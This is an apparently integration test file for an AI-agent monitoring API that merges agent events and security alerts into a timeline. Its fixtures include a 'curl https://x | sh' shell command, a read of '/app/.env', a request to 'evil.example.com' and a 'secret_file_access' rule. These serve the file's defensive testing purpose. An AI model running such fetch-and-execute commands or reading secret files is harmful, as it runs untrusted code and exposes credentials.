"""GET /v1/agents/{agent_id}/timeline."""

from __future__ import annotations

from datetime import datetime, timedelta
from typing import Any

import pytest
from fastapi.testclient import TestClient
from pycommon import Database, Severity

from tests.conftest import seed_alert, seed_event

pytestmark = pytest.mark.integration


def get_timeline(
    client: TestClient, agent_id: str = "agent-alpha", **params: Any
) -> list[dict[str, Any]]:
    """Call the endpoint, assert it answered 200, and return the entries."""
    response = client.get(f"/v1/agents/{agent_id}/timeline", params=params)
    assert response.status_code == 200, response.text
    return response.json()["items"]


class TestMerging:
    def test_interleaves_events_and_alerts_by_timestamp(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        """The point of the endpoint: seeing an alert land between the events
        that surrounded it."""
        before = seed_event(db, occurred_at=now - timedelta(minutes=3))
        detected = seed_alert(db, event_id=before, created_at=now - timedelta(minutes=2))
        after = seed_event(db, occurred_at=now - timedelta(minutes=1))

        entries = get_timeline(client)

        assert [entry["reference_id"] for entry in entries] == [after, detected, before]

    def test_sets_the_kind_discriminator_correctly(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        event_id = seed_event(db, occurred_at=now - timedelta(minutes=2))
        alert_id = seed_alert(db, event_id=event_id, created_at=now - timedelta(minutes=1))

        kinds = {entry["reference_id"]: entry["kind"] for entry in get_timeline(client)}

        assert kinds == {event_id: "event", alert_id: "alert"}

    def test_reference_id_is_the_event_id_for_events(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        event_id = seed_event(db, occurred_at=now - timedelta(minutes=1))

        assert [entry["reference_id"] for entry in get_timeline(client)] == [event_id]

    def test_reference_id_is_the_alert_id_for_alerts(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        event_id = seed_event(db, occurred_at=now - timedelta(minutes=1))
        alert_id = seed_alert(db, event_id=event_id, created_at=now)

        alerts = [entry for entry in get_timeline(client) if entry["kind"] == "alert"]

        assert [entry["reference_id"] for entry in alerts] == [alert_id]

    def test_returns_events_when_the_agent_has_no_alerts(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        seed_event(db, occurred_at=now - timedelta(minutes=1))

        entries = get_timeline(client)

        assert [entry["kind"] for entry in entries] == ["event"]

    def test_orders_newest_first(self, client: TestClient, db: Database, now: datetime) -> None:
        oldest = seed_event(db, occurred_at=now - timedelta(hours=3))
        newest = seed_event(db, occurred_at=now - timedelta(minutes=5))
        middle = seed_event(db, occurred_at=now - timedelta(hours=1))

        assert [entry["reference_id"] for entry in get_timeline(client)] == [
            newest,
            middle,
            oldest,
        ]

    def test_ordering_is_stable_for_identical_timestamps(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        """An event and its alert can share a timestamp; the tiebreak keeps the
        output deterministic."""
        at = now - timedelta(minutes=1)
        event_id = seed_event(db, occurred_at=at)
        seed_alert(db, event_id=event_id, created_at=at)

        kinds = [entry["kind"] for entry in get_timeline(client)]

        # Ordered by kind after the timestamp, so 'alert' precedes 'event'.
        assert kinds == ["alert", "event"]


class TestBriefText:
    def test_event_brief_names_the_type_and_salient_field(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        """A file_read reads as the path, an http_request as the URL, so the
        timeline is legible without opening each raw event."""
        seed_event(
            db,
            occurred_at=now - timedelta(minutes=2),
            type_="file_read",
            payload={"path": "/app/.env"},
        )
        seed_event(
            db,
            occurred_at=now - timedelta(minutes=1),
            type_="http_request",
            payload={"url": "https://evil.example.com"},
        )

        briefs = [entry["brief"] for entry in get_timeline(client)]

        assert briefs == [
            "http_request: https://evil.example.com",
            "file_read: /app/.env",
        ]

    def test_event_brief_uses_the_command_for_a_shell_event(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        seed_event(
            db,
            occurred_at=now - timedelta(minutes=1),
            type_="shell_command",
            payload={"command": "curl https://x | sh"},
        )

        assert get_timeline(client)[0]["brief"] == "shell_command: curl https://x | sh"

    def test_alert_brief_is_the_alert_summary(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        event_id = seed_event(db, occurred_at=now - timedelta(minutes=2))
        seed_alert(db, event_id=event_id, created_at=now, summary="read /app/.env")

        alerts = [entry for entry in get_timeline(client) if entry["kind"] == "alert"]

        assert alerts[0]["brief"] == "read /app/.env"

    def test_event_brief_survives_a_missing_payload_field(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        """A payload with no recognisable field still yields a usable brief
        rather than raising."""
        seed_event(
            db,
            occurred_at=now - timedelta(minutes=1),
            type_="tool_call",
            payload={"unrecognised": "shape"},
        )

        assert get_timeline(client)[0]["brief"] == "tool_call"


class TestSeverityAndRule:
    def test_alerts_carry_severity_and_rule(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        event_id = seed_event(db, occurred_at=now - timedelta(minutes=2))
        seed_alert(
            db,
            event_id=event_id,
            rule="secret_file_access",
            severity=Severity.HIGH,
            created_at=now,
        )

        alert = next(entry for entry in get_timeline(client) if entry["kind"] == "alert")

        assert alert["severity"] == "high"
        assert alert["rule"] == "secret_file_access"

    def test_events_carry_neither(self, client: TestClient, db: Database, now: datetime) -> None:
        seed_event(db, occurred_at=now - timedelta(minutes=1))

        entry = get_timeline(client)[0]

        assert entry["severity"] is None
        assert entry["rule"] is None


class TestScoping:
    def test_excludes_other_agents(self, client: TestClient, db: Database, now: datetime) -> None:
        mine = seed_event(db, agent_id="agent-alpha", occurred_at=now - timedelta(minutes=1))
        seed_event(db, agent_id="agent-beta", occurred_at=now - timedelta(minutes=1))

        assert [entry["reference_id"] for entry in get_timeline(client)] == [mine]

    def test_applies_the_time_window_to_both_kinds(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        stale_event = seed_event(db, occurred_at=now - timedelta(hours=30))
        seed_alert(db, event_id=stale_event, created_at=now - timedelta(hours=25))
        recent = seed_event(db, occurred_at=now - timedelta(hours=1))

        entries = get_timeline(client)

        assert [entry["reference_id"] for entry in entries] == [recent]

    def test_respects_the_limit(self, client: TestClient, db: Database, now: datetime) -> None:
        for index in range(5):
            seed_event(db, occurred_at=now - timedelta(minutes=index))

        entries = get_timeline(client, limit=2)

        assert len(entries) == 2

    def test_limit_applies_to_the_merged_stream(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        """The reason for UNION ALL over two separate queries: a limit applied
        per-kind could return a page of only events with the interleaved alerts
        pushed off the end, which is exactly the information the endpoint
        exists to show."""
        older_events = [
            seed_event(db, occurred_at=now - timedelta(minutes=10 + index)) for index in range(4)
        ]
        newest_event = seed_event(db, occurred_at=now - timedelta(minutes=1))
        newest_alert = seed_alert(db, event_id=newest_event, created_at=now)

        entries = get_timeline(client, limit=2)

        # The two newest rows overall, not the two newest events with the alert
        # pushed off the end.
        assert [entry["reference_id"] for entry in entries] == [newest_alert, newest_event]
        assert not set(older_events) & {entry["reference_id"] for entry in entries}

    def test_unknown_agent_returns_an_empty_list(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        seed_event(db, agent_id="agent-alpha", occurred_at=now)

        assert get_timeline(client, "agent-who") == []


class TestResponseEnvelope:
    def test_wraps_the_entries_in_a_page(
        self, client: TestClient, db: Database, now: datetime
    ) -> None:
        """Uniform with /v1/alerts, so a client parses one shape."""
        seed_event(db, occurred_at=now - timedelta(minutes=1))

        body = client.get("/v1/agents/agent-alpha/timeline", params={"limit": 10}).json()

        assert set(body) == {"items", "total", "limit", "offset"}
        assert body["total"] == 1
        assert body["limit"] == 10
        assert body["offset"] == 0

    def test_rejects_an_unparseable_window(self, client: TestClient) -> None:
        response = client.get("/v1/agents/agent-alpha/timeline", params={"window": "7w"})

        assert response.status_code == 400
